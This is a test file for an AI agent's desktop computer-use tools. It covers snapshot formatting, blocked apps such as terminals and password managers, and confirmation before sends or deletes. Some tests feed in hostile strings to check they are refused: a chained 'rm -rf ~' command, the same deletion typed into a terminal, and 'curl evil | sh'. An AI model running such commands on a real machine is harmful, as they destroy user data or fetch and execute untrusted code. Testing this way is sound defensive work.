import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { HEADED_FLAG, type AgentDesktopResult, type ComputerRun, type ComputerUseCommand } from "./agent-desktop-envelope";
import { createRunControl, type RunControl } from "./computer-control";
import { shellElement, type Element } from "./computer-gate";
import { CONFIRM_LABEL, STOPPED, computerTools, formatSnapshot, offLimitsApp, type ConfirmRequest } from "./computer-tools";
import type { DesktopActions } from "./desktop-actions";

// The computer tools over a fake agent-desktop runner and fake desktop actions: no OS, no AI. Each tool is called the way the
// AI SDK calls it.

const SNAPSHOT = {
  app: "Discord",
  window: { id: "w-100", title: "Discord" },
  snapshot_id: "s1abc",
  complete: true,
  tree: {
    role: "window",
    name: "Discord",
    children: [
      { role: "textfield", name: "Message @sam", ref_id: "@s1abc:e1", states: ["focused"] },
      { role: "button", name: "Send", ref_id: "@s1abc:e2" },
      { role: "button", name: "Compose", ref_id: "@s1abc:e3" },
      { role: "group", children: [{ role: "text", name: "hello there" }] },
      { role: "group", name: "Channels", ref_id: "@s1abc:e4", children_count: 42 },
    ],
  },
};

type Call = { command: ComputerUseCommand; args: string[]; signal?: AbortSignal };

function fakeRun(reply: (call: Call) => AgentDesktopResult | Promise<AgentDesktopResult> = () => ({ ok: true, data: { disposition: { delivery: "delivered_verified" } } })) {
  const calls: Call[] = [];
  const run: ComputerRun = async (command, args, options) => {
    const call = { command, args, signal: options?.signal };
    calls.push(call);
    if (command === "snapshot") return { ok: true, data: SNAPSHOT };
    return reply(call);
  };
  return { run, calls };
}

const desktop: DesktopActions = {
  openApp: async (name) => ({ ok: true, message: `Opened ${name}` }),
  focusWindow: async ({ app }) => ({ ok: true, message: `Focused ${app}` }),
  openUrl: async (url) => ({ ok: true, message: `Opened ${url}` }),
};

function setup(options: { askFirst?: boolean; confirm?: (request: ConfirmRequest, signal: AbortSignal) => Promise<boolean>; run?: ComputerRun; control?: RunControl } = {}) {
  const fake = fakeRun();
  const run = options.run ?? fake.run;
  const control = options.control ?? createRunControl();
  const asked: ConfirmRequest[] = [];
  const steps: string[] = [];
  const tools = computerTools({
    run,
    desktop,
    control,
    platform: "mac",
    askFirst: () => options.askFirst ?? true,
    confirm: async (request, signal) => {
      asked.push(request);
      return options.confirm ? options.confirm(request, signal) : true;
    },
    onStep: (label) => steps.push(label),
  });
  // The AI SDK's call shape.
  const call = <K extends keyof typeof tools>(name: K, input: Parameters<NonNullable<(typeof tools)[K]["execute"]>>[0]) =>
    (tools[name].execute as (input: unknown, options: unknown) => Promise<unknown>)(input, { toolCallId: `t-${String(name)}`, messages: [] });
  return { tools, call, calls: fake.calls, control, asked, steps };
}

beforeEach(() => {
  vi.spyOn(console, "debug").mockImplementation(() => undefined);
});
afterEach(() => vi.restoreAllMocks());

describe("formatSnapshot", () => {
  it("lists elements with refs, one line each, and remembers what each ref is", () => {
    const seen = new Map<string, Element>();
    const { text, app, focused } = formatSnapshot(SNAPSHOT, (ref, element) => seen.set(ref, element));
    expect(app).toBe("Discord");
    expect(text.split("\n")).toEqual([
      'App "Discord", window "Discord" (w-100)',
      'window "Discord"',
      '  textfield "Message @sam" @s1abc:e1 [focused]',
      '  button "Send" @s1abc:e2',
      '  button "Compose" @s1abc:e3',
      '  text "hello there"',
      '  group "Channels" @s1abc:e4 (42 inside: snapshot it with root)',
    ]);
    // Each ref keeps where it sits: the containers above it, its neighbours' labels and a text field beside it.
    expect(seen.get("@s1abc:e2")).toEqual({
      role: "button",
      name: "Send",
      context: { app: "Discord", ancestors: [{ role: "window", name: "Discord" }], nearby: ["Message @sam", "Compose", "Channels"], field: { role: "textfield", name: "Message @sam" } },
    });
    expect(focused).toMatchObject({ role: "textfield", name: "Message @sam" });
  });

  it("keeps the containers around each ref, and only short neighbour labels, never a text field's draft", () => {
    const seen = new Map<string, Element>();
    const data = {
      app: "Slack",
      window: { title: "general - Acme" },
      tree: {
        role: "window",
        name: "Slack",
        children: [
          {
            role: "group",
            name: "Composer",
            children: [
              { role: "textarea", name: "", value: "please search for the doc", ref_id: "@s2:e1" },
              { role: "toolbar", name: "Formatting", children: [{ role: "button", name: "Bold", ref_id: "@s2:e2" }, { role: "button", name: "", ref_id: "@s2:e3" }] },
            ],
          },
          {
            role: "list",
            name: "Messages in general",
            children: [
              { role: "listitem", name: "Sam: I will send the order confirmation to everyone tomorrow morning", ref_id: "@s2:e4" },
              { role: "listitem", name: "Kim: ok", ref_id: "@s2:e5" },
            ],
          },
        ],
      },
    };
    formatSnapshot(data, (ref, element) => seen.set(ref, element));
    // A text field's name never falls back to its draft (here it would read as a search box).
    expect(seen.get("@s2:e1")).toMatchObject({ role: "textarea", name: "", value: "please search for the doc" });
    expect(seen.get("@s2:e3")?.context).toEqual({
      app: "Slack general - Acme",
      ancestors: [{ role: "toolbar", name: "Formatting" }, { role: "group", name: "Composer" }, { role: "window", name: "Slack" }],
      nearby: ["Bold"],
      field: { role: "textarea", name: "" },
    });
    // A long message is content, not a label: it is not a neighbour.
    expect(seen.get("@s2:e5")?.context?.nearby).toEqual([]);
  });

  it("puts a root snapshot's region under the containers Bee kept for that ref", () => {
    const window = { role: "window", name: "Slack" };
    const within = { ref: "@s1:e7", element: { role: "group", name: "Composer", context: { app: "Slack", ancestors: [window], nearby: [], field: null } } };
    const seen = new Map<string, Element>();
    formatSnapshot({ tree: { role: "group", name: "Composer", ref_id: "@s1:e7", children: [{ role: "button", name: "", ref_id: "@s9:e1" }] } }, (ref, element) => seen.set(ref, element), undefined, within);
    expect(seen.get("@s9:e1")?.context).toMatchObject({ app: "Slack", ancestors: [{ role: "group", name: "Composer" }, window] });
    // A tree whose top is not the ref itself sits under it.
    formatSnapshot({ tree: { role: "group", name: "Inner", children: [{ role: "button", name: "", ref_id: "@s9:e2" }] } }, (ref, element) => seen.set(ref, element), undefined, within);
    expect(seen.get("@s9:e2")?.context?.ancestors).toEqual([{ role: "group", name: "Inner" }, { role: "group", name: "Composer" }, window]);
  });

  it("cuts a huge tree to fit", () => {
    const children = Array.from({ length: 3000 }, (_, index) => ({ role: "button", name: `Item ${index}`, ref_id: `@s1:e${index}` }));
    const { text } = formatSnapshot({ app: "Slack", tree: { role: "window", children } }, () => undefined, 2000);
    expect(text.length).toBeLessThan(2100);
    expect(text).toMatch(/more not shown/);
  });
});

describe("computerTools: what runs", () => {
  it("snapshots an app headless, then clicks a ref from it with fixed argv", async () => {
    const { call, calls } = setup({ askFirst: false });
    expect(await call("snapshot", { app: "Discord" })).toContain('button "Send" @s1abc:e2');
    expect(await call("click", { ref: "@s1abc:e3", effect: "none" })).toBe("Done (delivered_verified).");
    expect(calls.map(({ command, args }) => [command, ...args])).toEqual([
      ["snapshot", "--interactive-only", "--compact", "--app=Discord", "--timeout-ms=8000"],
      ["click", "@s1abc:e3"],
    ]);
  });

  it("types after --, and passes physical keys only when asked", async () => {
    const { call, calls } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    await call("type_text", { ref: "@s1abc:e1", text: "-5 is fine", effect: "none" });
    await call("type_text", { ref: "@s1abc:e1", text: "ok", effect: "none", physical: true });
    await call("set_value", { ref: "@s1abc:e1", value: "draft", effect: "none" });
    expect(calls.slice(1).map(({ command, args }) => [command, ...args])).toEqual([
      ["type", "@s1abc:e1", "--", "-5 is fine"],
      ["type", "@s1abc:e1", HEADED_FLAG, "--", "ok"],
      ["set-value", "@s1abc:e1", "--", "draft"],
    ]);
  });

  it("presses keys in a named app only, and closes apps but never Finder, Explorer or Bee", async () => {
    const { call, calls } = setup({ askFirst: false });
    expect(await call("press_key", { keys: "Cmd + W", app: "Google Chrome", effect: "none" })).toMatch(/^Done/);
    expect(await call("press_key", { keys: "cmd+w; rm -rf ~", app: "Google Chrome", effect: "none" })).toMatch(/^Error/);
    expect(await call("close_app", { name: "Discord" })).toMatch(/^Done/);
    for (const name of ["Finder", "File Explorer", "Bee"]) expect(await call("close_app", { name })).toMatch(/^Error/);
    expect(calls.map(({ command, args }) => [command, ...args])).toEqual([
      ["press", "cmd+w", "--app=Google Chrome"],
      ["close-app", "Discord"],
    ]);
  });

  it("acts only on refs and window ids this task has seen", async () => {
    const { call, calls } = setup({ askFirst: false });
    expect(await call("click", { ref: "@s1abc:e2", effect: "none" })).toMatch(/^Error: use a ref/);
    expect(await call("click", { ref: "@e2", effect: "none" })).toMatch(/^Error: use a ref/);
    expect(await call("snapshot", { app: "Discord", window_id: "w-999" })).toMatch(/window id/);
    expect(await call("snapshot", { root: "@s1abc:e4" })).toMatch(/^Error: use a ref/);
    expect(calls).toEqual([]);
    await call("snapshot", { app: "Discord" });
    expect(await call("snapshot", { root: "@s1abc:e4" })).toContain("Discord");
    expect(await call("snapshot", { app: "Discord", window_id: "w-100" })).toContain("Discord");
  });

  it("never reads, types into or screenshots terminals, system settings, password managers or Bee", async () => {
    for (const name of ["Terminal", "iTerm2", "Windows PowerShell", "System Settings", "Keychain Access", "1Password", "Bee"]) expect(offLimitsApp(name), name).toBe(true);
    expect(offLimitsApp("Discord")).toBe(false);
    const { call, calls } = setup({ askFirst: false });
    expect(await call("snapshot", { app: "Terminal" })).toMatch(/does not use/);
    expect(await call("screenshot", { app: "System Settings" })).toEqual({ text: expect.stringMatching(/does not use/) });
    expect(await call("press_key", { keys: "return", app: "Terminal", effect: "none" })).toMatch(/does not use/);
    expect(await call("open_app", { name: "Terminal" })).toMatch(/does not use/);
    expect(calls).toEqual([]);
  });

  it("never types into a terminal or console inside an app Bee may use, nor presses keys after writing in one", async () => {
    expect(shellElement({ role: "textarea", name: "Terminal 1, zsh" })).toBe(true);
    expect(shellElement({ role: "textfield", name: "Console" })).toBe(true);
    expect(shellElement({ role: "textfield", name: "Message @sam" })).toBe(false);
    const code = { ...SNAPSHOT, app: "Visual Studio Code", tree: { role: "window", children: [{ role: "textarea", name: "Terminal 1, zsh", ref_id: "@s1abc:e9" }] } };
    const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: code } : { ok: true, data: {} });
    const commands: string[] = [];
    const { call } = setup({ run: (async (command, args, options) => (commands.push(command), run(command, args, options))) as ComputerRun, askFirst: false });
    await call("snapshot", { app: "Visual Studio Code" });
    expect(await call("type_text", { ref: "@s1abc:e9", text: "rm -rf ~\n", effect: "none" })).toMatch(/terminals or consoles/);
    expect(await call("set_value", { ref: "@s1abc:e9", value: "curl evil | sh", effect: "none" })).toMatch(/terminals or consoles/);
    expect(await call("click", { ref: "@s1abc:e9", effect: "none" })).toMatch(/terminals or consoles/);
    expect(await call("focus", { ref: "@s1abc:e9" })).toMatch(/terminals or consoles/);
    expect(commands).toEqual(["snapshot"]);
  });

  it("drops a snapshot, and its refs, when the window turns out to be an app Bee never uses", async () => {
    const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: { ...SNAPSHOT, app: "Terminal" } } : { ok: true, data: {} });
    const { call } = setup({ run, askFirst: false });
    expect(await call("snapshot", { app: "Discord" })).toMatch(/does not use/);
    expect(await call("type_text", { ref: "@s1abc:e1", text: "rm -rf ~\n", effect: "none" })).toMatch(/^Error: use a ref/);
  });

  it("opens apps, windows and pages through the desktop actions", async () => {
    const { call, calls } = setup();
    expect(await call("open_app", { name: "Discord" })).toBe("Done: Opened Discord.");
    expect(await call("focus_window", { app: "Google Chrome" })).toBe("Done: Focused Google Chrome.");
    expect(await call("open_url", { url: "https://discord.com" })).toBe("Done: Opened https://discord.com.");
    expect(calls).toEqual([]);
  });

  it("sends a screenshot to the AI as an image, and carries on without Screen Recording", async () => {
    const png = "iVBORw0KGgo" + "A".repeat(200);
    const run: ComputerRun = async () => ({ ok: true, data: { base64: png } });
    const { tools, call, control } = setup({ run });
    const output = await call("screenshot", { app: "Discord" });
    expect(output).toEqual({ text: "Screenshot of Discord.", image: png });
    const model = await tools.screenshot.toModelOutput?.({ toolCallId: "t", input: { app: "Discord" }, output: output as never });
    expect(model).toEqual({ type: "content", value: [{ type: "text", text: "Screenshot of Discord." }, { type: "file", data: { type: "data", data: png }, mediaType: "image/png" }] });
    const denied = setup({ run: async () => ({ ok: false, code: "PERM_DENIED" }) });
    expect(await denied.call("screenshot", { app: "Discord" })).toEqual({ text: expect.stringMatching(/Screen Recording/) });
    expect(denied.control.reason()).toBeNull();
    expect(control.reason()).toBeNull();
  });

  it("ends the run when Accessibility is refused", async () => {
    const run: ComputerRun = async () => ({ ok: false, code: "PERM_DENIED" });
    const { call, control } = setup({ run });
    expect(await call("list_apps", {})).toMatch(/PERM_DENIED/);
    expect(control.reason()).toBe("permission");
    expect(await call("list_apps", {})).toBe(STOPPED);
  });

  it("shows each step as one short line", async () => {
    const { call, steps } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    await call("click", { ref: "@s1abc:e3", effect: "none" });
    await call("type_text", { ref: "@s1abc:e1", text: "hi", effect: "none" });
    await call("press_key", { keys: "cmd+w", app: "Google Chrome", effect: "none" });
    expect(steps).toEqual(["Looking at Discord…", "Clicking Compose…", "Typing in Message @sam…", "Pressing Cmd+W…"]);
  });

  it("runs parallel calls one at a time, in order", async () => {
    const order: string[] = [];
    const run: ComputerRun = async (command, args) => {
      if (command === "snapshot") return { ok: true, data: SNAPSHOT };
      order.push(`start ${command}`);
      await new Promise((resolve) => setTimeout(resolve, command === "type" ? 20 : 0));
      order.push(`end ${command} ${args.at(-1)}`);
      return { ok: true, data: {} };
    };
    const { call } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Discord" });
    await Promise.all([call("type_text", { ref: "@s1abc:e1", text: "hi", effect: "none" }), call("click", { ref: "@s1abc:e3", effect: "none" })]);
    expect(order).toEqual(["start type", "end type hi", "start click", "end click @s1abc:e3"]);
  });
});

describe("computerTools: loop controls", () => {
  it("does nothing past the step limit", async () => {
    const { call, calls, control } = setup({ control: createRunControl({ maxSteps: 2 }) });
    await call("snapshot", { app: "Discord" });
    await call("click", { ref: "@s1abc:e3", effect: "none" });
    expect(await call("click", { ref: "@s1abc:e3", effect: "none" })).toBe(STOPPED);
    expect(calls).toHaveLength(2);
    expect(control.reason()).toBe("steps");
  });

  it("aborts the command in flight on stop", async () => {
    let started: () => void = () => undefined;
    const running = new Promise<void>((resolve) => (started = resolve));
    const run: ComputerRun = (_command, _args, options) =>
      new Promise((resolve) => {
        started();
        options?.signal?.addEventListener("abort", () => resolve({ ok: false, code: "ABORTED" }));
      });
    const { call, control } = setup({ run });
    const pending = call("list_apps", {});
    await running;
    control.stop("user");
    expect(await pending).toMatch(/ABORTED/);
    expect(await call("list_apps", {})).toBe(STOPPED);
  });
});

describe("computerTools: ask before sending or deleting", () => {
  it("waits for Confirm before a send, then sends", async () => {
    let answer: (confirmed: boolean) => void = () => undefined;
    const { call, calls, asked, steps } = setup({ confirm: () => new Promise((resolve) => (answer = resolve)) });
    await call("snapshot", { app: "Discord" });
    const click = call("click", { ref: "@s1abc:e2", effect: "none" });
    await vi.waitFor(() => expect(asked).toHaveLength(1));
    expect(asked[0]).toEqual({ kind: "send", question: "Send this?", detail: "Click “Send” in Discord" });
    expect(steps.at(-1)).toBe(CONFIRM_LABEL);
    expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
    answer(true);
    expect(await click).toMatch(/^Done/);
    expect(calls.map((item) => item.command)).toEqual(["snapshot", "click"]);
    expect(steps.at(-1)).toBe("Clicking Send…");
  });

  it("stops the task, and never sends, on Cancel", async () => {
    const { call, calls, control } = setup({ confirm: async () => false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s1abc:e2", effect: "none" })).toBe(STOPPED);
    expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
    expect([control.reason(), control.declined()]).toEqual(["declined", "send"]);
  });

  it("asks before Return in a message box and before an effect the AI declares, but not before drafting", async () => {
    const { call, asked } = setup();
    await call("snapshot", { app: "Discord" });
    await call("type_text", { ref: "@s1abc:e1", text: "Running late", effect: "none" });
    await call("click", { ref: "@s1abc:e3", effect: "none" });
    expect(asked).toEqual([]);
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Return in “Message @sam”"]]);
    await call("click", { ref: "@s1abc:e3", effect: "delete" });
    expect(asked.map((request) => request.kind)).toEqual(["send", "delete"]);
  });

  it("runs on its own with the setting off", async () => {
    const { call, calls, asked } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s1abc:e2", effect: "send" })).toMatch(/^Done/);
    expect(asked).toEqual([]);
    expect(calls.map((item) => item.command)).toEqual(["snapshot", "click"]);
  });

  it("reads Stop while waiting as Cancel, and does not count the wait against the clock", async () => {
    vi.useFakeTimers();
    try {
      const control = createRunControl({ maxMs: 5000 });
      const { call, calls } = setup({ control, confirm: () => new Promise(() => undefined) });
      await call("snapshot", { app: "Discord" });
      const click = call("click", { ref: "@s1abc:e2", effect: "none" });
      await vi.advanceTimersByTimeAsync(30_000);
      expect(control.reason()).toBeNull();
      control.stop("user");
      expect(await click).toBe(STOPPED);
      expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
      expect(control.reason()).toBe("user");
    } finally {
      vi.useRealTimers();
    }
  });
});

describe("computerTools: the confirm gate reads the tree, not the AI", () => {
  // Discord with an unlabelled arrow send button beside the message box, and a message's hover toolbar with a trash icon.
  const DISCORD = {
    app: "Discord",
    window: { id: "w-200", title: "@sam - Discord" },
    tree: {
      role: "window",
      name: "Discord",
      children: [
        { role: "tree", name: "Direct Messages", children: [{ role: "treeitem", name: "sam", ref_id: "@s3:e1" }] },
        { role: "textfield", name: "Search", ref_id: "@s3:e2" },
        {
          role: "list",
          name: "Messages in @sam",
          children: [
            {
              role: "listitem",
              name: "sam: hello there",
              children: [{ role: "toolbar", name: "Message actions", children: [{ role: "button", name: "Add Reaction", ref_id: "@s3:e3" }, { role: "button", name: "🗑", ref_id: "@s3:e4" }] }],
            },
          ],
        },
        {
          role: "group",
          name: "Message @sam",
          ref_id: "@s3:e5",
          children: [
            { role: "button", name: "Upload a file", ref_id: "@s3:e6" },
            { role: "textfield", name: "Message @sam", ref_id: "@s3:e7" },
            { role: "button", name: "Emoji", ref_id: "@s3:e8" },
            { role: "button", name: "", ref_id: "@s3:e9" },
          ],
        },
      ],
    },
  };
  const discordRun = (extra: (call: Call) => AgentDesktopResult | null = () => null) => {
    const commands: Call[] = [];
    const run: ComputerRun = async (command, args) => {
      commands.push({ command, args });
      return extra({ command, args }) ?? (command === "snapshot" ? { ok: true, data: DISCORD } : { ok: true, data: {} });
    };
    return { run, commands };
  };

  it("asks before clicking an unlabelled send arrow, though the AI said none", async () => {
    const { run, commands } = discordRun();
    const { call, asked } = setup({ run, confirm: async () => false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s3:e9", effect: "none" })).toBe(STOPPED);
    expect(asked).toEqual([{ kind: "send", question: "Send this?", detail: "Click the selected item in Discord" }]);
    expect(commands.map((item) => item.command)).toEqual(["snapshot"]);
  });

  it("asks before a trash icon, but not before navigating, drafting or opening the emoji picker", async () => {
    const { run } = discordRun();
    const { call, asked } = setup({ run });
    await call("snapshot", { app: "Discord" });
    await call("click", { ref: "@s3:e1", effect: "none" });
    await call("click", { ref: "@s3:e7", effect: "none" });
    await call("set_value", { ref: "@s3:e7", value: "Running late", effect: "none" });
    await call("click", { ref: "@s3:e8", effect: "none" });
    expect(asked).toEqual([]);
    await call("click", { ref: "@s3:e4", effect: "none" });
    await call("click", { ref: "@s3:e6", effect: "none" });
    expect(asked.map((request) => request.kind)).toEqual(["delete", "send"]);
  });

  it("asks before Return once focus may have left a search box", async () => {
    const { run } = discordRun();
    const { call, asked } = setup({ run });
    await call("snapshot", { app: "Discord" });
    await call("type_text", { ref: "@s3:e2", text: "sam", effect: "none" });
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked).toEqual([]);
    // The search jumped somewhere: focus is unknown, so a second Return asks.
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["submit", "Press Return in Discord"]]);
    // Clicking into the message box puts focus there; Return sends.
    await call("click", { ref: "@s3:e7", effect: "none" });
    await call("press_key", { keys: "ctrl+enter", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail]).at(-1)).toEqual(["send", "Press Ctrl+Enter in “Message @sam”"]);
  });

  it("asks before Return when a snapshot shows the message box focused, with nothing typed this run", async () => {
    const focused = { ...SNAPSHOT, tree: { role: "window", children: [{ role: "textarea", name: "Message #job-search", ref_id: "@s4:e1", states: ["focused"] }] } };
    const { call, asked } = setup({ run: async (command) => (command === "snapshot" ? { ok: true, data: focused } : { ok: true, data: {} }) });
    await call("snapshot", { app: "Discord" });
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Return in “Message #job-search”"]]);
  });

  it("keeps the containers above a root snapshot's region, and asks before an unlabelled match from find", async () => {
    // The region alone says nothing (no app, no names): only what Bee kept about @s3:e5 shows it is Discord's message box.
    const region = { tree: { role: "group", name: "", ref_id: "@s3:e5", children: [{ role: "button", name: "", ref_id: "@s5:e1" }] } };
    const { run } = discordRun(({ command, args }) => {
      if (command === "snapshot" && args.includes("--root=@s3:e5")) return { ok: true, data: region };
      if (command === "find") return { ok: true, data: { matches: [{ role: "button", name: "", ref_id: "@s6:e1" }, { role: "button", name: "Gift", ref_id: "@s6:e2" }] } };
      return null;
    });
    const { call, asked } = setup({ run });
    await call("snapshot", { app: "Discord" });
    await call("snapshot", { root: "@s3:e5" });
    await call("click", { ref: "@s5:e1", effect: "none" });
    expect(asked.map((request) => request.kind)).toEqual(["send"]);
    await call("find", { app: "Discord", role: "button" });
    await call("click", { ref: "@s6:e2", effect: "none" });
    expect(asked).toHaveLength(1);
    await call("click", { ref: "@s6:e1", effect: "none" });
    expect(asked.map((request) => request.kind)).toEqual(["send", "send"]);
  });

  it("still runs on its own with the setting off", async () => {
    const { run, commands } = discordRun();
    const { call, asked } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s3:e9", effect: "none" })).toMatch(/^Done/);
    expect(await call("click", { ref: "@s3:e4", effect: "none" })).toMatch(/^Done/);
    expect(asked).toEqual([]);
    expect(commands.map((item) => item.command)).toEqual(["snapshot", "click", "click"]);
  });
});
